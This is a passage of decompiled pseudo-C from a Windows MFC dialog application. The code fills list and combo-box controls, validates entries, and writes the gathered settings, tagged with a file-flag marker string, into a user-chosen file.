  *(undefined *)(unaff_EBP + -4) = 5;
  CString::CString((CString *)(this + 0x59));
  *(undefined *)(unaff_EBP + -4) = 6;
  CString::CString((CString *)(this + 0x5c));
  *(undefined *)(unaff_EBP + -4) = 7;
  CString::CString((CString *)(this + 0x5d));
  *(undefined *)(unaff_EBP + -4) = 8;
  *this = &PTR_LAB_0040b5f8;
  CString::operator=((CString *)(this + 0x58),&DAT_0040e9e8);
  CString::operator=((CString *)(this + 0x59),&DAT_0040e9e8);
  this[0x5a] = 0;
  this[0x5b] = 0;
  CString::operator=((CString *)(this + 0x5c),&DAT_0040e9e8);
  CString::operator=((CString *)(this + 0x5d),&DAT_0040e9e8);
  this[0x5e] = 0;
  this[0x5f] = 0;
  this[0x60] = 0;
  this[0x61] = 0;
  this[0x62] = 0;
  this[99] = 0;
  AfxGetModuleState();
  lpIconName = (LPCSTR)0x80;
  hInstance = AfxFindResourceHandle((char *)0x80,(char *)0xe);
  pHVar1 = LoadIconA(hInstance,lpIconName);
  this[0x65] = pHVar1;
  this[100] = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return this;
}



void * __thiscall FUN_0040115d(void *this,byte param_1)

{
  FUN_00401179();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



void FUN_00401179(void)

{
  CDialog *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(CDialog **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 7;
  CString::~CString((CString *)(this + 0x174));
  *(undefined *)(unaff_EBP + -4) = 6;
  CString::~CString((CString *)(this + 0x170));
  *(undefined *)(unaff_EBP + -4) = 5;
  CString::~CString((CString *)(this + 0x164));
  *(undefined *)(unaff_EBP + -4) = 4;
  CString::~CString((CString *)(this + 0x160));
  *(undefined *)(unaff_EBP + -4) = 3;
  CComboBox::~CComboBox((CComboBox *)(this + 0x120));
  *(undefined *)(unaff_EBP + -4) = 2;
  CComboBox::~CComboBox((CComboBox *)(this + 0xe0));
  *(undefined *)(unaff_EBP + -4) = 1;
  CListCtrl::~CListCtrl((CListCtrl *)(this + 0xa0));
  *(undefined *)(unaff_EBP + -4) = 0;
  CListCtrl::~CListCtrl((CListCtrl *)(this + 0x60));
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CDialog::~CDialog(this);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void __thiscall FUN_0040121a(void *this,CDataExchange *param_1)

{
  DDX_Control(param_1,0x3ea,(CWnd *)((int)this + 0x60));
  DDX_Control(param_1,0x3f0,(CWnd *)((int)this + 0xa0));
  DDX_Control(param_1,0x3f5,(CWnd *)((int)this + 0xe0));
  DDX_Control(param_1,0x3eb,(CWnd *)((int)this + 0x120));
  DDX_Text(param_1,0x3ec,(CString *)((int)this + 0x160));
  DDX_Text(param_1,0x3f4,(CString *)((int)this + 0x164));
  DDX_Text(param_1,0x3f7,(int *)((int)this + 0x168));
  DDX_Text(param_1,0x3ff,(int *)((int)this + 0x16c));
  DDX_Text(param_1,0x3fd,(CString *)((int)this + 0x170));
  DDX_Text(param_1,0x3fe,(CString *)((int)this + 0x174));
  DDX_Text(param_1,0x3fb,(int *)((int)this + 0x178));
  DDX_Text(param_1,0x3fa,(int *)((int)this + 0x17c));
  DDX_Check(param_1,0x3fc,(int *)((int)this + 0x180));
  DDX_Check(param_1,0x3f8,(int *)((int)this + 0x184));
  DDX_Check(param_1,0x3f9,(int *)((int)this + 0x188));
  DDX_Check(param_1,0x403,(int *)((int)this + 0x18c));
  DDX_Check(param_1,0x402,(int *)((int)this + 400));
  return;
}



void FUN_00401362(void)

{
  HWND pHVar1;
  int iVar2;
  undefined4 uVar3;
  void **ppvVar4;
  LRESULT LVar5;
  ulong uVar6;
  undefined3 extraout_var;
  void *pvVar7;
  uint uVar8;
  CString *pCVar9;
  CWnd *this;
  int iVar10;
  int unaff_EBP;
  undefined4 *puVar11;
  undefined4 *puVar12;
  bool bVar13;
  char *pcVar14;
  size_t _Size;
  
  FUN_0040a1d0();
  *(undefined *)(unaff_EBP + -0x6c) = 0;
  puVar11 = (undefined4 *)(unaff_EBP + -0x6b);
  for (iVar10 = 0xf; iVar10 != 0; iVar10 = iVar10 + -1) {
    *puVar11 = 0;
    puVar11 = puVar11 + 1;
  }
  *(undefined2 *)puVar11 = 0;
  *(undefined *)((int)puVar11 + 2) = 0;
  CString::CString((CString *)(unaff_EBP + -0x14));
  pHVar1 = *(HWND *)(this + 0x20);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  KillTimer(pHVar1,1);
  CWnd::UpdateData(this,1);
  if (*(int *)(*(int *)(this + 0x174) + -8) == 0) {
    pcVar14 = &DAT_0040e1b8;
LAB_004013b8:
    CWnd::MessageBoxA(this,pcVar14,(char *)0x0,0);
    goto LAB_00401961;
  }
  pHVar1 = *(HWND *)(this + 0x80);
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  LVar5 = SendMessageA(pHVar1,0x1004,0,0);
  if (0 < LVar5) {
    do {
      uVar6 = CListCtrl::GetItemData((CListCtrl *)(this + 0x60),*(int *)(unaff_EBP + -0x10));
      if (uVar6 == 6) break;
      *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
      LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x10) < LVar5);
  }
  LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if ((*(int *)(unaff_EBP + -0x10) == LVar5) &&
     (iVar10 = CWnd::MessageBoxA(this,&DAT_0040e190,(char *)0x0,4), iVar10 == 7)) goto LAB_00401961;
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if (0 < LVar5) {
    do {
      uVar6 = CListCtrl::GetItemData((CListCtrl *)(this + 0x60),*(int *)(unaff_EBP + -0x10));
      if (uVar6 == 7) break;
      *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
      LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x10) < LVar5);
  }
  LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if (*(int *)(unaff_EBP + -0x10) == LVar5) {
    iVar10 = CWnd::MessageBoxA(this,&DAT_0040e150,(char *)0x0,4);
    if (iVar10 == 7) goto LAB_00401961;
  }
  else if (*(int *)(*(int *)(this + 0x170) + -8) == 0) {
    pcVar14 = &DAT_0040e130;
    goto LAB_004013b8;
  }
  FUN_004051ff(&DAT_0040ef74,DAT_0040f028,1);
  uVar8 = DAT_0040f020;
  *(LPCVOID *)(unaff_EBP + -0x18) = DAT_0040f01c;
  DAT_0040f01c = (LPCVOID)0x0;
  DAT_0040f020 = 0;
  iVar10 = *(int *)(this + 0x18c);
  *(uint *)(unaff_EBP + -0x2c) = uVar8;
  if (((iVar10 == 0) && (*(int *)(this + 400) == 0)) &&
     (LVar5 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0), LVar5 == 0)) {
    if (*(int *)(this + 0x180) == 0) {
      pcVar14 = &DAT_0040e0e4;
LAB_0040150c:
      CWnd::MessageBoxA(this,pcVar14,(char *)0x0,0);
LAB_00401513:
      if (*(int *)(unaff_EBP + -0x18) != 0) {
        operator_delete(*(void **)(unaff_EBP + -0x18));
      }
      goto LAB_00401961;
    }
  }
  else {
    bVar13 = FUN_004051ff(&DAT_0040ef74,DAT_0040f024,1);
    if ((CONCAT31(extraout_var,bVar13) == 0) && (DAT_0040f01c == (LPCVOID)0x0)) {
      if (*(int *)(this + 0x180) == 0) {
        pcVar14 = &DAT_0040e074;
        goto LAB_0040150c;
      }
      iVar10 = CWnd::MessageBoxA(this,&DAT_0040e0a0,(char *)0x0,4);
      if (iVar10 == 7) goto LAB_00401513;
    }
  }
  strcpy((char *)(unaff_EBP + -0x6c),s_UNINT_FILE_FLAG_0040e064);
  _strlwr((char *)(unaff_EBP + -0x6c));
  strcpy((char *)(unaff_EBP + -0x5c),*(char **)(this + 0x170));
  iVar10 = *(int *)(this + 0x168);
  *(undefined4 *)(unaff_EBP + -0x4c) = *(undefined4 *)(this + 0x180);
  *(int *)(unaff_EBP + -0x44) = *(int *)(this + 0x17c) * 1000;
  iVar2 = *(int *)(this + 0x16c);
  *(int *)(unaff_EBP + -0x40) = *(int *)(this + 0x178) * 1000;
  *(int *)(unaff_EBP + -0x3c) = iVar10 << 10;
  *(int *)(unaff_EBP + -0x38) = iVar2 << 10;
  *(undefined4 *)(unaff_EBP + -0x34) = *(undefined4 *)(this + 0x184);
  *(undefined2 *)(unaff_EBP + -0x30) = *(undefined2 *)(this + 0x188);
  *(undefined2 *)(unaff_EBP + -0x2e) = *(undefined2 *)(this + 400);
  if ((iVar10 != 0) || (*(undefined4 *)(unaff_EBP + -0x24) = 0, iVar2 != 0)) {
    *(undefined4 *)(unaff_EBP + -0x24) = 1;
  }
  LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  *(LRESULT *)(unaff_EBP + -0x20) = LVar5;
  LVar5 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  iVar10 = (uint)(DAT_0040f01c != (LPCVOID)0x0) + *(int *)(unaff_EBP + -0x24) + LVar5 + 1 +
           *(int *)(unaff_EBP + -0x20);
  *(int *)(unaff_EBP + -0x48) = iVar10;
  pvVar7 = operator_new(iVar10 * 0x18);
  *(void **)(unaff_EBP + -0x1c) = pvVar7;
  memset(*(void **)(unaff_EBP + -0x1c),0,*(int *)(unaff_EBP + -0x48) * 0x18);
  puVar11 = *(undefined4 **)(unaff_EBP + -0x1c);
  *puVar11 = 8;
  uVar8 = *(int *)(*(int *)(this + 0x174) + -8) + 1;
  puVar11[1] = uVar8;
  pvVar7 = operator_new(uVar8);
  _Size = *(size_t *)(*(int *)(unaff_EBP + -0x1c) + 4);
  *(void **)(*(int *)(unaff_EBP + -0x1c) + 0x10) = pvVar7;
  pcVar14 = CString::GetBuffer((CString *)(this + 0x174),0);
  memcpy(*(void **)(*(int *)(unaff_EBP + -0x1c) + 0x10),pcVar14,_Size);
  bVar13 = DAT_0040f01c != (LPCVOID)0x0;
  *(undefined4 *)(unaff_EBP + -0x24) = 1;
  if (bVar13) {
    iVar10 = *(int *)(unaff_EBP + -0x1c);
    *(undefined4 *)(unaff_EBP + -0x24) = 2;
    *(undefined4 *)(iVar10 + 0x18) = 1;
    *(uint *)(iVar10 + 0x1c) = DAT_0040f020;
    *(LPCVOID *)(iVar10 + 0x28) = DAT_0040f01c;
  }
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if (0 < LVar5) {
    *(int *)(unaff_EBP + -0x20) =
         *(int *)(unaff_EBP + -0x1c) + 0x10 + *(int *)(unaff_EBP + -0x24) * 0x18;
    do {
      uVar6 = CListCtrl::GetItemData((CListCtrl *)(this + 0x60),*(int *)(unaff_EBP + -0x10));
      uVar3 = *(undefined4 *)(unaff_EBP + -0x10);
      *(ulong *)(*(int *)(unaff_EBP + -0x20) + -0x10) = uVar6;
      pCVar9 = (CString *)CListCtrl::GetItemText((CListCtrl *)(this + 0x60),unaff_EBP + -0x28,uVar3)
      ;
      *(undefined *)(unaff_EBP + -4) = 1;
      CString::operator=((CString *)(unaff_EBP + -0x14),pCVar9);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x28));
      uVar8 = *(int *)(*(int *)(unaff_EBP + -0x14) + -8) + 1;
      *(uint *)(*(int *)(unaff_EBP + -0x20) + -0xc) = uVar8;
      pvVar7 = operator_new(uVar8);
      ppvVar4 = *(void ***)(unaff_EBP + -0x20);
      *ppvVar4 = pvVar7;
      pvVar7 = ppvVar4[-3];
      pcVar14 = CString::GetBuffer((CString *)(unaff_EBP + -0x14),0);
      memcpy(**(void ***)(unaff_EBP + -0x20),pcVar14,(size_t)pvVar7);
      *(int *)(unaff_EBP + -0x24) = *(int *)(unaff_EBP + -0x24) + 1;
      *(int *)(unaff_EBP + -0x20) = *(int *)(unaff_EBP + -0x20) + 0x18;
      *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
      LVar5 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x10) < LVar5);
  }
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  LVar5 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  if (0 < LVar5) {
    *(int *)(unaff_EBP + -0x20) =
         *(int *)(unaff_EBP + -0x1c) + 0x10 + *(int *)(unaff_EBP + -0x24) * 0x18;
    do {
      uVar3 = *(undefined4 *)(unaff_EBP + -0x10);
      *(undefined4 *)(*(int *)(unaff_EBP + -0x20) + -0x10) = 2;
      pCVar9 = (CString *)CListCtrl::GetItemText((CListCtrl *)(this + 0xa0),unaff_EBP + -0x28,uVar3)
      ;
      *(undefined *)(unaff_EBP + -4) = 2;
      CString::operator=((CString *)(unaff_EBP + -0x14),pCVar9);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x28));
      CString::operator+=((CString *)(unaff_EBP + -0x14),&DAT_0040e060);
      pCVar9 = (CString *)
               CListCtrl::GetItemText
                         ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x24,
                          *(undefined4 *)(unaff_EBP + -0x10));
      *(undefined *)(unaff_EBP + -4) = 3;
      CString::operator+=((CString *)(unaff_EBP + -0x14),pCVar9);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x24));
      uVar8 = *(int *)(*(int *)(unaff_EBP + -0x14) + -8) + 1;
      *(uint *)(*(int *)(unaff_EBP + -0x20) + -0xc) = uVar8;
      pvVar7 = operator_new(uVar8);
      ppvVar4 = *(void ***)(unaff_EBP + -0x20);
      *ppvVar4 = pvVar7;
      pvVar7 = ppvVar4[-3];
      pcVar14 = CString::GetBuffer((CString *)(unaff_EBP + -0x14),0);
      memcpy(**(void ***)(unaff_EBP + -0x20),pcVar14,(size_t)pvVar7);
      pcVar14 = strchr(**(char ***)(unaff_EBP + -0x20),0x7c);
      *pcVar14 = '\0';
      *(int *)(unaff_EBP + -0x20) = *(int *)(unaff_EBP + -0x20) + 0x18;
      *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
      LVar5 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x10) < LVar5);
  }
  FUN_0040504e(0x40ef74);
  DAT_0040f018 = *(undefined4 *)(unaff_EBP + -0x1c);
  puVar11 = (undefined4 *)(unaff_EBP + -0x6c);
  puVar12 = &DAT_0040efd8;
  for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {
    *puVar12 = *puVar11;
    puVar11 = puVar11 + 1;
    puVar12 = puVar12 + 1;
  }
  FUN_004054b0(&DAT_0040ef74,DAT_0040f02c,2,(LPCVOID)0x0,0);
  iVar10 = FUN_004054b0(&DAT_0040ef74,*(LPCSTR *)(this + 0x174),0,*(LPCVOID *)(unaff_EBP + -0x18),
                        *(uint *)(unaff_EBP + -0x2c));
  if (iVar10 == 0) {
    pcVar14 = &DAT_0040e038;
  }
  else {
    pcVar14 = &DAT_0040e04c;
  }
  CWnd::MessageBoxA(this,pcVar14,(char *)0x0,0);
  if (*(int *)(this + 0x18c) != 0) {
    CString::CString((CString *)(unaff_EBP + -0x24),(CString *)(this + 0x174));
    *(undefined *)(unaff_EBP + -4) = 4;
    CString::operator+=((CString *)(unaff_EBP + -0x24),&DAT_0040e030);
    FUN_004054b0(&DAT_0040ef74,*(LPCSTR *)(unaff_EBP + -0x24),1,DAT_0040f01c,DAT_0040f020);
    *(undefined *)(unaff_EBP + -4) = 0;
    CString::~CString((CString *)(unaff_EBP + -0x24));
  }
  if (*(int *)(unaff_EBP + -0x18) != 0) {
    operator_delete(*(void **)(unaff_EBP + -0x18));
  }
  DAT_0040f01c = (LPCVOID)0x0;
  DAT_0040f020 = 0;
  FUN_0040504e(0x40ef74);
LAB_00401961:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x14));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



undefined4 __fastcall FUN_0040197c(CDialog *param_1)

{
  bool bVar1;
  uint uVar2;
  WPARAM WVar3;
  undefined3 extraout_var;
  int *piVar4;
  int iVar5;
  LRESULT LVar6;
  size_t sVar7;
  char *pcVar8;
  int local_c;
  int local_8;
  int local_4;
  
  CDialog::OnInitDialog(param_1);
  SendMessageA(*(HWND *)(param_1 + 0x20),0x80,1,*(LPARAM *)(param_1 + 0x194));
  SendMessageA(*(HWND *)(param_1 + 0x20),0x80,0,*(LPARAM *)(param_1 + 0x194));
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0x60),0,&DAT_0040e260,0,0x78,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0x60),1,&DAT_0040e258,0,0x1b8,-1);
  uVar2 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1037,0,0);
  SendMessageA(*(HWND *)(param_1 + 0x80),0x1036,0,uVar2 | 0x21);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),0,&DAT_0040e250,0,100,-1);
  CListCtrl::InsertColumn((CListCtrl *)(param_1 + 0xa0),1,&DAT_0040e248,0,100,-1);
  uVar2 = SendMessageA(*(HWND *)(param_1 + 0xc0),0x1037,0,0);
  SendMessageA(*(HWND *)(param_1 + 0xc0),0x1036,0,uVar2 | 0x21);
  WVar3 = SendMessageA(*(HWND *)(param_1 + 0x140),0x143,0,0x40e23c);
  SendMessageA(*(HWND *)(param_1 + 0x140),0x151,WVar3,5);
  WVar3 = SendMessageA(*(HWND *)(param_1 + 0x140),0x143,0,0x40e230);
  SendMessageA(*(HWND *)(param_1 + 0x140),0x151,WVar3,4);
  WVar3 = SendMessageA(*(HWND *)(param_1 + 0x140),0x143,0,0x40e220);
  SendMessageA(*(HWND *)(param_1 + 0x140),0x151,WVar3,6);
  WVar3 = SendMessageA(*(HWND *)(param_1 + 0x140),0x143,0,0x40e210);
  SendMessageA(*(HWND *)(param_1 + 0x140),0x151,WVar3,7);
  SendMessageA(*(HWND *)(param_1 + 0x140),0x14e,0,0);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x143,0,0x40e204);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x143,0,0x40e1f8);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x143,0,0x40e1ec);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x143,0,0x40e1e0);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x143,0,0x40e1d4);
  SendMessageA(*(HWND *)(param_1 + 0x100),0x14e,0,0);
  bVar1 = FUN_004051ff(&DAT_0040ef74,DAT_0040f02c,0);
  if (CONCAT31(extraout_var,bVar1) != 0) {
    local_c = 0;
    local_4 = 0;
    if (0 < DAT_0040effc) {
      local_8 = 0;
      do {
        piVar4 = (int *)(DAT_0040f018 + local_8);
        if (piVar4[1] != 0) {
          iVar5 = *piVar4;
          if (iVar5 == 2) {
            LVar6 = SendMessageA(*(HWND *)(param_1 + 0xc0),0x1004,0,0);
            local_c = CListCtrl::InsertItem
                                ((CListCtrl *)(param_1 + 0xa0),1,LVar6,
                                 *(char **)(local_8 + 0x10 + DAT_0040f018),0,0,0,0);
            sVar7 = strlen(*(char **)(local_8 + 0x10 + DAT_0040f018));
            CListCtrl::SetItemText
                      ((CListCtrl *)(param_1 + 0xa0),local_c,1,
                       (char *)(sVar7 + 1 + *(int *)(local_8 + 0x10 + DAT_0040f018)));
          }
          else {
            if (iVar5 == 4) {
              iVar5 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
              pcVar8 = &DAT_0040e230;
            }
            else if (iVar5 == 5) {
              iVar5 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
              pcVar8 = &DAT_0040e23c;
            }
            else if (iVar5 == 6) {
              iVar5 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
              pcVar8 = &DAT_0040e220;
            }
            else {
              if (iVar5 != 7) {
                if (iVar5 == 8) {
                  CString::operator=((CString *)(param_1 + 0x174),(char *)piVar4[4]);
                }
                goto LAB_00401c7f;
              }
              iVar5 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
              pcVar8 = &DAT_0040e210;
            }
            local_c = CListCtrl::InsertItem((CListCtrl *)(param_1 + 0x60),1,iVar5,pcVar8,0,0,0,0);
          }
LAB_00401c7f:
          uVar2 = *(uint *)(local_8 + DAT_0040f018);
          if ((3 < uVar2) && (uVar2 < 8)) {
            CListCtrl::SetItemText
                      ((CListCtrl *)(param_1 + 0x60),local_c,1,
                       (char *)((uint *)(local_8 + DAT_0040f018))[4]);
            CListCtrl::SetItem((CListCtrl *)(param_1 + 0x60),local_c,0,4,(char *)0x0,0,0,0,
                               *(long *)(local_8 + DAT_0040f018));
          }
        }
        local_4 = local_4 + 1;
        local_8 = local_8 + 0x18;
      } while (local_4 < DAT_0040effc);
    }
    CString::operator=((CString *)(param_1 + 0x170),&DAT_0040efe8);
    *(undefined4 *)(param_1 + 0x180) = DAT_0040eff8;
    *(uint *)(param_1 + 0x17c) = DAT_0040f000 / 1000;
    *(uint *)(param_1 + 0x178) = DAT_0040f004 / 1000;
    *(uint *)(param_1 + 0x168) = DAT_0040f008 >> 10;
    *(uint *)(param_1 + 0x16c) = DAT_0040f00c >> 10;
    *(undefined4 *)(param_1 + 0x184) = DAT_0040f010;
    *(uint *)(param_1 + 0x188) = (uint)DAT_0040f014;
    *(uint *)(param_1 + 400) = (uint)DAT_0040f016;
    CWnd::UpdateData((CWnd *)param_1,0);
  }
  return 1;
}



void FUN_00401d74(void)

{
  CListCtrl *this;
  HWND hWnd;
  WPARAM wParam;
  LRESULT LVar1;
  ulong uVar2;
  uchar **ppuVar3;
  int iVar4;
  CWnd *this_00;
  int unaff_EBP;
  char *pcVar5;
  uint uVar6;
  
  FUN_0040a1d0();
  CString::CString((CString *)(unaff_EBP + -0x1c));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::UpdateData(this_00,1);
  if (*(int *)(*(int *)(this_00 + 0x160) + -8) == 0) {
    CWnd::MessageBoxA(this_00,&DAT_0040e2c0,(char *)0x0,0);
  }
  wParam = SendMessageA(*(HWND *)(this_00 + 0x140),0x147,0,0);
  LVar1 = SendMessageA(*(HWND *)(this_00 + 0x140),0x150,wParam,0);
  *(LRESULT *)(unaff_EBP + -0x18) = LVar1;
  hWnd = *(HWND *)(this_00 + 0x80);
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  LVar1 = SendMessageA(hWnd,0x1004,0,0);
  if (0 < LVar1) {
    do {
      if ((*(int *)(unaff_EBP + -0x18) == 6) || (*(int *)(unaff_EBP + -0x18) == 7)) {
        uVar2 = CListCtrl::GetItemData((CListCtrl *)(this_00 + 0x60),*(int *)(unaff_EBP + -0x14));
        if (uVar2 != *(ulong *)(unaff_EBP + -0x18)) goto LAB_00401e12;
        pcVar5 = &DAT_0040e2a0;
        if (*(int *)(unaff_EBP + -0x18) != 6) {
          pcVar5 = &DAT_0040e280;
        }
        uVar6 = 0;
LAB_00401f0b:
        CWnd::MessageBoxA(this_00,pcVar5,(char *)0x0,uVar6);
        goto LAB_00401ed4;
      }
LAB_00401e12:
      uVar6 = 1;
      *(undefined4 *)(unaff_EBP + -0x20) = *(undefined4 *)(this_00 + 0x160);
      ppuVar3 = (uchar **)
                CListCtrl::GetItemText
                          ((CListCtrl *)(this_00 + 0x60),unaff_EBP + -0x24,
                           *(undefined4 *)(unaff_EBP + -0x14));
      iVar4 = _mbsicmp(*ppuVar3,*(uchar **)(unaff_EBP + -0x20));
      *(char *)(unaff_EBP + -0xd) = '\x01' - (iVar4 != 0);
      CString::~CString((CString *)(unaff_EBP + -0x24));
      if (*(char *)(unaff_EBP + -0xd) != '\0') {
        pcVar5 = &DAT_0040e268;
        goto LAB_00401f0b;
      }
      *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + -0x14) + 1;
      LVar1 = SendMessageA(*(HWND *)(this_00 + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x14) < LVar1);
  }
  LVar1 = SendMessageA(*(HWND *)(this_00 + 0x140),0x147,0,0);
  CComboBox::GetLBText((CComboBox *)(this_00 + 0x120),LVar1,(CString *)(unaff_EBP + -0x1c));
  LVar1 = SendMessageA(*(HWND *)(this_00 + 0x80),0x1004,0,0);
  this = (CListCtrl *)(this_00 + 0x60);
  iVar4 = CListCtrl::InsertItem(this,1,LVar1,*(char **)(unaff_EBP + -0x1c),0,0,0,0);
  pcVar5 = *(char **)(this_00 + 0x160);
  *(int *)(unaff_EBP + -0x14) = iVar4;
  CListCtrl::SetItemText(this,iVar4,1,pcVar5);
  CListCtrl::SetItem(this,*(int *)(unaff_EBP + -0x14),0,4,(char *)0x0,0,0,0,
                     *(long *)(unaff_EBP + -0x18));
LAB_00401ed4:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00401f14(void)

{
  CListCtrl *this;
  HWND hWnd;
  LRESULT LVar1;
  WPARAM wParam;
  ulong uVar2;
  uchar **ppuVar3;
  int iVar4;
  CWnd *this_00;
  int unaff_EBP;
  char *pcVar5;
  uint uVar6;
  
  FUN_0040a1d0();
  LVar1 = SendMessageA(*(HWND *)(this_00 + 0x80),0x1042,0,0);
  *(LRESULT *)(unaff_EBP + -0x1c) = LVar1;
  CString::CString((CString *)(unaff_EBP + -0x14));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (*(int *)(unaff_EBP + -0x1c) < 0) {
    uVar6 = 0;
    pcVar5 = &DAT_0040e2e8;
LAB_004020c9:
    CWnd::MessageBoxA(this_00,pcVar5,(char *)0x0,uVar6);
  }
  else {
    CWnd::UpdateData(this_00,1);
    if (*(int *)(*(int *)(this_00 + 0x160) + -8) == 0) {
      CWnd::MessageBoxA(this_00,&DAT_0040e2c0,(char *)0x0,0);
    }
    wParam = SendMessageA(*(HWND *)(this_00 + 0x140),0x147,0,0);
    LVar1 = SendMessageA(*(HWND *)(this_00 + 0x140),0x150,wParam,0);
    *(LRESULT *)(unaff_EBP + -0x20) = LVar1;
    hWnd = *(HWND *)(this_00 + 0x80);
    *(undefined4 *)(unaff_EBP + -0x18) = 0;
    LVar1 = SendMessageA(hWnd,0x1004,0,0);
    if (0 < LVar1) {
      do {
        if (*(int *)(unaff_EBP + -0x18) != *(int *)(unaff_EBP + -0x1c)) {
          uVar2 = CListCtrl::GetItemData((CListCtrl *)(this_00 + 0x60),*(int *)(unaff_EBP + -0x18));
          if (uVar2 == *(ulong *)(unaff_EBP + -0x20)) {
            if (*(int *)(unaff_EBP + -0x20) == 6) {
              pcVar5 = &DAT_0040e2a0;
            }
            else {
              if (*(int *)(unaff_EBP + -0x20) != 7) goto LAB_00401fe3;
              pcVar5 = &DAT_0040e280;
            }
            uVar6 = 0;
            goto LAB_004020c9;
          }
LAB_00401fe3:
          uVar6 = 1;
          *(undefined4 *)(unaff_EBP + -0x24) = *(undefined4 *)(this_00 + 0x160);
          ppuVar3 = (uchar **)
                    CListCtrl::GetItemText
                              ((CListCtrl *)(this_00 + 0x60),unaff_EBP + -0x28,
                               *(undefined4 *)(unaff_EBP + -0x18));
          iVar4 = _mbsicmp(*ppuVar3,*(uchar **)(unaff_EBP + -0x24));
          *(char *)(unaff_EBP + -0xd) = '\x01' - (iVar4 != 0);
          CString::~CString((CString *)(unaff_EBP + -0x28));
          if (*(char *)(unaff_EBP + -0xd) != '\0') {
            pcVar5 = &DAT_0040e2d0;
            goto LAB_004020c9;
          }
        }
        *(int *)(unaff_EBP + -0x18) = *(int *)(unaff_EBP + -0x18) + 1;
        LVar1 = SendMessageA(*(HWND *)(this_00 + 0x80),0x1004,0,0);
      } while (*(int *)(unaff_EBP + -0x18) < LVar1);
    }
    LVar1 = SendMessageA(*(HWND *)(this_00 + 0x140),0x147,0,0);
    CComboBox::GetLBText((CComboBox *)(this_00 + 0x120),LVar1,(CString *)(unaff_EBP + -0x14));
    this = (CListCtrl *)(this_00 + 0x60);
    CListCtrl::SetItemText(this,*(int *)(unaff_EBP + -0x1c),0,*(char **)(unaff_EBP + -0x14));
    CListCtrl::SetItemText(this,*(int *)(unaff_EBP + -0x1c),1,*(char **)(this_00 + 0x160));
    CListCtrl::SetItem(this,*(int *)(unaff_EBP + -0x1c),0,4,(char *)0x0,0,0,0,
                       *(long *)(unaff_EBP + -0x20));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x14));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00402114(void)

{
  uchar *_Str2;
  uchar *_Str1;
  char *pcVar1;
  bool bVar2;
  LRESULT LVar3;
  uchar **ppuVar4;
  int iVar5;
  CWnd *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  CString::CString((CString *)(unaff_EBP + -0x10));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::UpdateData(this,1);
  CWnd::GetWindowTextA(this + 0xe0,(CString *)(unaff_EBP + -0x10));
